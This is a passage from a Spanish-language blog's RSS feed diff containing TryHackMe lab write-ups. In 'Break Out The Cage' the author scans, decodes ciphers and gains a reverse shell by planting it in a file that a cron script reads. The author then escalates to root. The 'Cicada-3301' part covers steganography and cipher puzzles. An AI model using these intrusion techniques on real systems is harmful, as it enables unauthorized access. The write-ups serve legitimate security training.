+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Session timeout in seconds is &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Control connection is plain text
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Data connections will be plain text
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      At session startup, client count was &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      vsFTPd 3.0.3 - secure, fast, stable
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Nicholas Cage Stories
+Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 27 22:50:38 2020 -- 1 IP address (1 host up) scanned in 1582.44 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_212632.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/breakoutthecage# gobuster dir -u http://breakthecage.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; -x php,html,txt
+/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/scripts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/contracts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/auditions &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Encontramos un directorio en donde hay un archivo mp3.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_214502.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;Sonic Visualiser&lt;/code&gt; para verificar que el archivo no tenga algo dentro agregando una capa de espectrograma. Logramos ver una palabra que seguramente nos servira. &lt;em&gt;Puede que alguna de las letras sea engañosa, &lt;code&gt;audacity&lt;/code&gt; tambien trae la opcion de agregar una capa de espectrograma.&lt;/em&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_220332.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ftp---task-1&#34;&gt;FTP - &lt;em&gt;Task 1&lt;/em&gt;&lt;/h2&gt;
+&lt;p&gt;Nos conectamos al servicio FTP con las credenciales de anonymous:anonymous y encontramos un archivo que esta codificado en base64.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_220508.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;CyberChef&lt;/code&gt; para decodificar el mensaje, al realizar esto vemos el mensaje &amp;ldquo;descompuesto&amp;rdquo;. Utilizamos &lt;code&gt;Vigenere Cipher&lt;/code&gt; con la palabra que encontramos para obtener el mensaje real. &lt;em&gt;Task 1&lt;/em&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_220704.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user---weston---cage&#34;&gt;USER - WESTON -&amp;gt; CAGE&lt;/h2&gt;
+&lt;p&gt;Ahora que encontramos la contraseña de weston iniciamos sesion en el servicio ssh. Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;/usr/bin/bees&lt;/code&gt;. El archivo contiene un comando, pero este no puede ser editado por el usuario actual.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_221307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;pspy64&lt;/code&gt; para ver si existe algun cronjob en la maquina, esto porque durante la enumeracion de los archivos se imprimia un mensaje diferente en pantalla.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_221929.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Encontramos un archivo que se ejecuta y se encuentra en el directorio &lt;code&gt;/opt/&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_222245.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;El codigo del script en python lee el archivo &lt;code&gt;.quotes&lt;/code&gt; en el que hay una larga lista de frases, elige una aleatoria, la imprime mediante el comando &lt;code&gt;wall&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_222425.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Para poder tomar ventaja de este script deberia de quedar de la siguiente forma para poder ejecutar comandos y una posible shell inversa.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_222740.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Renombramos el archivo &lt;code&gt;.quotes&lt;/code&gt;, creamos uno nuevo con una frase y nuestra shell inversa.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_223420.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ponemos a la escucha netcat en nuestra maquina, esperamos, y logramos obtener una shell con el usuario cage.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_223705.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_223835.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;En la carpeta principal de &lt;em&gt;cage&lt;/em&gt; encontramos el archivo &lt;code&gt;id_rsa&lt;/code&gt; que nos da acceso a una shell en el servicio ssh. En la carpeta &lt;code&gt;email_backup&lt;/code&gt; encontramos varios correos en tres archivos. En uno de ellos hablan sobre una nota y lo que esta decia.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_224722.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Intentamos utilizarla como contraseña del usuario root pero no funcionó, por lo que utilizamos nuevamente &lt;code&gt;vignere cipher&lt;/code&gt; pero esta vez no teniamos la clave y utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; ya que nos muestra una lista de posibles claves y su resultado. Logramos encontrar su clave y el mensaje real.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_224915.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos el mensaje real como contraseña del usuario root y logramos obtener acceso con este usuario, además encontramos nuevamente un backup de correos en su carpeta principal y en uno de ellos nuestra flag *&lt;em&gt;root.txt&lt;/em&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/Screenshot_20200627_225002.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/breakthecage/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/breakthecage/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>vigenere</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>TryHackMe - Cicada-3301 Vol:1</title>
+        <link>https://sckull.github.io/posts/cicada3301vol1/</link>
+        <pubDate>Thu, 07 May 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Thu, 07 May 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/cicada3301vol1/</guid>
+        <description>Cicada-3301 Vol:1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
+        <content:encoded>&lt;p&gt;Cicada-3301 Vol:1 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Cicada-3301 Vol:1&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;A basic steganography and cryptography challenge room based on the Cicada 3301 challenges&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;148&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Media&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Cryillic&#34;&gt;Cryillic&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;analyze-the-audio&#34;&gt;Analyze The Audio&lt;/h2&gt;
+&lt;p&gt;Al inicio tenemos un archivo de audio (&lt;code&gt;3301.wav&lt;/code&gt;) al cual le añadimos una capa de espectrograma utilizando &lt;a href=&#34;https://www.sonicvisualiser.org/&#34;&gt;&lt;strong&gt;Sonic Visualiser&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005214.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Nos devuelve una imagen QR el cual obtuvimos una URL utilizando el &lt;a href=&#34;https://online-barcode-reader.inliteresearch.com/&#34;&gt;&lt;em&gt;Lector QR inlite&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_205257.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;decode-the-passphrase&#34;&gt;Decode the Passphrase&lt;/h2&gt;
+&lt;p&gt;Una URL hacia Pastebin.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005331.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005505.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para poder decodificar la frase y la clave en &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005555.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;code&gt;Vigenere&lt;/code&gt; para poder codificar nuevamente (como el reto lo indica) con la clave que encontramos a la frase decodificada.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005730.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gather-metadata&#34;&gt;Gather Metadata&lt;/h2&gt;
+&lt;p&gt;Utilizamos la frase que codificamos para extraer el archivo dentro de la imagen &lt;code&gt;welcome.jpg&lt;/code&gt;, y nos da una url de una image.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_211318.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;La imagen de la URL.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_211512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;find-hidden-files&#34;&gt;Find Hidden Files&lt;/h2&gt;
+&lt;p&gt;En este Task intentamos con muchas &lt;a href=&#34;https://github.com/DominicBreuker/stego-toolkit&#34;&gt;&lt;strong&gt;herramientas de esteganografia&lt;/strong&gt;&lt;/a&gt; y encontramos la correcta, Outguess para poder obtener la informacion (archivo) dentro de la imagen.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_213432.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En el mensaje nos indica que debemos de romper el hash para poder encontrar el libro.Tambien una combinacion de letras y numeros y que debemos de ir hacia delante si el numero es positivo, y hacia atras si el numero es negativo.&lt;/p&gt;
+&lt;p&gt;El hash:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;b6atryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackme348
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Verificamos que tipo de hash es y vemos que es &lt;code&gt;SHA2-512&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_213930.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos &lt;a href=&#34;https://md5hashing.net&#34;&gt;https://md5hashing.net&lt;/a&gt; para poder obtener el texto el cual es una URL a pastebin.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_214534.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;book-cipher&#34;&gt;Book Cipher&lt;/h2&gt;
+&lt;p&gt;La URL de pastebin contiene lo que parece ser el capitulo de un libro.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_000733.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Recordemos el nombre del challenge &lt;code&gt;Cicada 3301&lt;/code&gt;, investigamos acerca del reto, especificamente de la solucion, y encontramos que el reto se parece bastante a &lt;a href=&#34;https://the-cicada-puzzles.fandom.com/wiki/2014_Recruitment_Puzzle&#34;&gt;&lt;code&gt;Cicada 3301 - The Book Cipher&lt;/code&gt;&lt;/a&gt;, por lo que utilizamos el ejemplo para obtener la URL para el &lt;code&gt;Task 7&lt;/code&gt;, para ello escribimos un pequeño script en python al cual le pasamos la linea del libro y el numero de letra que debe extraer, omitimos la primera letra ya que hace referencia al &lt;code&gt;Capitulo I&lt;/code&gt; (es el que tenemos).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_001844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Hay que mencionar que este tipo de cifrado para resolverlo se puede utilizar la sintaxis siguiente (&lt;code&gt;par1:par2:par3&lt;/code&gt;), pueden ser &lt;strong&gt;numeros de pagina, linea, palabra o letra&lt;/strong&gt;, para este reto era sencillo: &lt;strong&gt;linea:letra&lt;/strong&gt; y omitimos los espacios ya que devuelve un valor distinto.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_002442.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Tambien, este cifrado para resolverlo comenzamos desde la primera letra de la Oracion y no de la linea, en el caso de los numeros negativos vamos hacia atras de la oracion como nos indicaba el mensaje.&lt;/p&gt;
+&lt;details&gt;
+    &lt;summary&gt;Spoiler&lt;/summary&gt; 
+    El script: [**Script.py**](https://github.com/sckull/ctf-stuff/tree/master/tryhackme/cicada3301_vol1)
+&lt;/details&gt;
+&lt;p&gt;Al resolverlo por completo nos devuelve una URL acortada que nos redirige a soundcloud.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_004724.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;the-final-song&#34;&gt;The Final Song&lt;/h2&gt;
+&lt;p&gt;Ingresar el Nombre de la Cancion encontrada.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_014020.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/cicada3301vol1/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/cicada3301vol1/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>vigenere</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>challenge</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
